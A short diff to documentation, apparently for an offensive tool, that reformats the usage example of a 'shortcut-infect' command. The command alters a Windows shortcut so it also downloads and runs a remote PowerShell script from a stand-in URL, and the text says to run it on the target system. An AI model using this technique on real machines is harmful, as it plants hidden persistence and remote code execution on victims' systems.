@@ -27,7 +27,10 @@ provided url.
 Modifies the specified existing shortcut to run the original program 
 and also execute a download and execute command string. 
 	
-   example: shortcut-infect "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
+   example: 
+   ```
+   shortcut-infect "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
+   ```
    requires the http:// or https:// in the URL.
 
 Only run this on the target system.
